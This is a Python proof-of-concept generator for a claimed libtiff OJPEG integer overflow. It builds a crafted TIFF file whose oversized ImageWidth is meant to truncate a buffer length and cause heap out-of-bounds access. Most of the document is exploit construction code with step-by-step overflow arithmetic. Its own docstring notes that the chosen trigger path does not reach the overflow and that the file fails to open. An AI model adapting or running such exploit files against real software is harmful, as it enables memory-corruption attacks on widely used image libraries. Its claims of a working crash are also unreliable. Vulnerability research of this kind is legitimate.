#!/usr/bin/env python3
"""
PoC generator for libtiff vuln_001:
  OJPEGWriteHeaderInfo() integer overflow (line 1142 of tif_ojpeg.c)

Vulnerability (tif_ojpeg.c lines 1138-1170):
  sp->subsampling_convert_ylinelen = ((strile_width + hor*8-1)/(hor*8)) * hor*8
  sp->subsampling_convert_ylines   = ver * 8
  sp->subsampling_convert_ybuflen  = ylinelen * ylines  // <-- uint32 overflow

With ImageWidth=0x20000001 and YCbCrSubSampling=[1,1] (hor=1, ver=1):
  ylinelen = ((0x20000001 + 7) / 8) * 8 = 0x20000008
  ylines   = 1*8 = 8
  ybuflen  = 0x20000008 * 8 = 0x100000040 -> truncated to 0x40 = 64  (OVERFLOW)
  cbuflen  = (0x20000008/1) * 8 = 0x100000040 -> 64
  ycbcrbuflen = 64 + 2*64 = 192 bytes  (actual tiny allocation)

  Row pointer for MCU row n=1:
    ybufptr[1] = ybuf + 1 * 0x20000008  (536 MB out-of-bounds)
  When libjpeg reads/writes to these pointers: heap-buffer-overflow.

TRIGGER PATH LIMITATION:
  tiffsplit calls TIFFReadRawStrip, which returns -1 immediately for OJPEG
  because OJPEG sets TIFF_NOREADRAW (tif_ojpeg.c line 448). The overflow at
  line 1142 is only reached via OJPEGPreDecode, which is called from
  TIFFStartStrip, which is only called from TIFFReadEncodedStrip/TIFFReadScanline.
  tiffsplit does NOT call these, so the crash cannot be triggered by tiffsplit.

  Additionally, with ImageWidth=0x20000001 and YCbCrSubSampling=[1,1]:
    TIFFScanlineSize() overflows internally (scanline*8 > 2^32) and returns 0,
    which causes TIFFReadDirectory() to fail at line 801 of tif_dirread.c,
    causing TIFFOpen() to return NULL. tiffsplit then exits without processing.

TIFF FILE STRUCTURE:
  Offset   0: TIFF header (II, 42, IFD@328)
  Offset   8: BitsPerSample data [8,8,8] (6 bytes uint16)
  Offset  16: QTable data (64 bytes, all 0x10)
  Offset  80: DC Huffman table (28 bytes: 16 counts + 12 values)
  Offset 108: AC Huffman table (178 bytes: 16 counts + 162 values)
  Offset 286: Strip data [0x28,0xA2,0xBF] (non-0xFF start -> no-SOF OJPEG path)
  Offset 292: JpegQTables offsets [16,16,16] (12 bytes)
  Offset 304: JpegDcTables offsets [80,80,80] (12 bytes)
  Offset 316: JpegAcTables offsets [108,108,108] (12 bytes)
  Offset 328: IFD (15 entries)
"""

import struct
import os
import sys

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.tif")


def u16(v):
    return struct.pack("<H", v)


def u32(v):
    return struct.pack("<I", v)


def ifd_entry(tag, typ, count, val):
    """Pack one 12-byte IFD entry."""
    return u16(tag) + u16(typ) + u32(count) + u32(val)


# ---------------------------------------------------------------------------
# Data sections
# ---------------------------------------------------------------------------

# Offset 8: BitsPerSample [8,8,8] — 6 bytes + 2 pad to reach offset 16
bps_data = u16(8) + u16(8) + u16(8)        # 6 bytes at offset 8
pad_to_16 = b'\x00\x00'                    # 2 bytes at offset 14

# Offset 16: Quantization table — 64 bytes (all 16/0x10)
qtable = bytes([0x10] * 64)

# Offset 80: DC Huffman table (standard JPEG luminance DC) — 28 bytes
dc_counts = bytes([0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0])  # 16 bytes
dc_values = bytes(range(12))                                             # 0..11, 12 bytes
dctable = dc_counts + dc_values  # 28 bytes total

# Offset 108: AC Huffman table (standard JPEG luminance AC) — 178 bytes
ac_counts = bytes([0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 125])  # 16 bytes
ac_values = bytes([
    0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12, 0x21, 0x31, 0x41, 0x06,
    0x13, 0x51, 0x61, 0x07, 0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xA1, 0x08,
    0x23, 0x42, 0xB1, 0xC1, 0x15, 0x52, 0xD1, 0xF0, 0x24, 0x33, 0x62, 0x72,
    0x82, 0x09, 0x0A, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x25, 0x26, 0x27, 0x28,
    0x29, 0x2A, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x43, 0x44, 0x45,
    0x46, 0x47, 0x48, 0x49, 0x4A, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59,
    0x5A, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x73, 0x74, 0x75,
    0x76, 0x77, 0x78, 0x79, 0x7A, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
    0x8A, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0xA2, 0xA3,
    0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6,
    0xB7, 0xB8, 0xB9, 0xBA, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9,
    0xCA, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xE1, 0xE2,
    0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xF1, 0xF2, 0xF3, 0xF4,
    0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA,
])  # 162 bytes
actable = ac_counts + ac_values  # 178 bytes total

# Validate layout
assert 8 + len(bps_data) + len(pad_to_16) == 16
assert 16 + len(qtable) == 80
assert 80 + len(dctable) == 108
assert 108 + len(actable) == 286

# Offset 286: Strip data — starts with non-0xFF to trigger no-SOF OJPEG path
STRIP_OFF = 286
strip_data = bytes([0x28, 0xA2, 0xBF])   # 3 bytes (valid all-zero-MCU Huffman bits)
pad_to_292 = b'\x00\x00\x00'             # 3 bytes (offset 289-291)

# Offset 292: JpegQTables offsets array (3 × uint32)
QTABLE_OFF  = 16
DCTABLE_OFF = 80
ACTABLE_OFF = 108

jqt_data = u32(QTABLE_OFF)  + u32(QTABLE_OFF)  + u32(QTABLE_OFF)   # 12 bytes at 292
jdt_data = u32(DCTABLE_OFF) + u32(DCTABLE_OFF) + u32(DCTABLE_OFF)  # 12 bytes at 304
jat_data = u32(ACTABLE_OFF) + u32(ACTABLE_OFF) + u32(ACTABLE_OFF)  # 12 bytes at 316

# Validate
assert 292 + len(jqt_data) == 304
assert 304 + len(jdt_data) == 316
assert 316 + len(jat_data) == 328

# ---------------------------------------------------------------------------
# IFD at offset 328
# ---------------------------------------------------------------------------
IFD_OFF = 328

# YCbCrSubSampling=[1,1]: 2 SHORTs packed into 4-byte IFD value field (LE)
ycbcr_sub_val = struct.unpack("<I", struct.pack("<HH", 1, 1))[0]

# Tags must be in ascending numeric order
entries = [
    ifd_entry(256, 4, 1, 0x20000001),   # ImageWidth  = 536870913  (0x20000001)
    ifd_entry(257, 4, 1, 8),             # ImageLength = 8
    ifd_entry(258, 3, 3, 8),             # BitsPerSample → data at offset 8
    ifd_entry(259, 3, 1, 6),             # Compression = 6 (OJPEG)
    ifd_entry(262, 3, 1, 6),             # PhotometricInterpretation = 6 (YCBCR)
    ifd_entry(273, 4, 1, STRIP_OFF),     # StripOffsets = 286
    ifd_entry(277, 3, 1, 3),             # SamplesPerPixel = 3
    ifd_entry(278, 4, 1, 8),             # RowsPerStrip = 8
    ifd_entry(279, 4, 1, 3),             # StripByteCounts = 3
    ifd_entry(284, 3, 1, 1),             # PlanarConfig = 1 (CONTIG)
    ifd_entry(519, 4, 3, 292),           # JpegQTables → offsets at 292
    ifd_entry(520, 4, 3, 304),           # JpegDcTables → offsets at 304
    ifd_entry(521, 4, 3, 316),           # JpegAcTables → offsets at 316
    ifd_entry(530, 3, 2, ycbcr_sub_val), # YCbCrSubSampling = [1,1]
    ifd_entry(531, 3, 1, 1),             # YCbCrPositioning = 1
]

ifd_data = u16(len(entries)) + b''.join(entries) + u32(0)  # count + entries + next=0

# ---------------------------------------------------------------------------
# Assemble file
# ---------------------------------------------------------------------------
header = b'II' + u16(42) + u32(IFD_OFF)

tiff = (
    header       +   # 0–7
    bps_data     +   # 8–13
    pad_to_16    +   # 14–15
    qtable       +   # 16–79
    dctable      +   # 80–107
    actable      +   # 108–285
    strip_data   +   # 286–288
    pad_to_292   +   # 289–291
    jqt_data     +   # 292–303
    jdt_data     +   # 304–315
    jat_data     +   # 316–327
    ifd_data         # 328–513
)

# ---------------------------------------------------------------------------
# Write output
# ---------------------------------------------------------------------------
print(f"[+] Output : {OUTPUT}")
print(f"[+] Size   : {len(tiff)} bytes")
print(f"[+] IFD    : offset {IFD_OFF}, {len(entries)} entries")
print(f"[+] Strip  : offset {STRIP_OFF}, data={strip_data.hex()}")
print()
print("[+] Overflow analysis:")
ylinelen = ((0x20000001 + 7) // 8) * 8
ylines   = 8
ybuflen  = (ylinelen * ylines) & 0xFFFFFFFF
print(f"    ImageWidth    = 0x{0x20000001:08X} = {0x20000001}")
print(f"    ylinelen      = 0x{ylinelen:08X} = {ylinelen}")
print(f"    ylines        = {ylines}")
print(f"    True product  = 0x{ylinelen * ylines:016X}")
print(f"    ybuflen(u32)  = 0x{ybuflen:08X} = {ybuflen}  <-- OVERFLOW")
print(f"    Row ptr[n=1]  = ybuf + {ylinelen} bytes OOB")
print()
print("[!] NOTE: tiffsplit cannot trigger the crash (uses TIFFReadRawStrip,")
print("    blocked by TIFF_NOREADRAW). OJPEGPreDecode requires TIFFReadEncodedStrip.")
print("    Additionally TIFFScanlineSize returns 0 for this width, causing")
print("    TIFFReadDirectory to fail and TIFFOpen to return NULL.")

with open(OUTPUT, 'wb') as f:
    f.write(tiff)

print(f"\n[+] Written: {OUTPUT}")
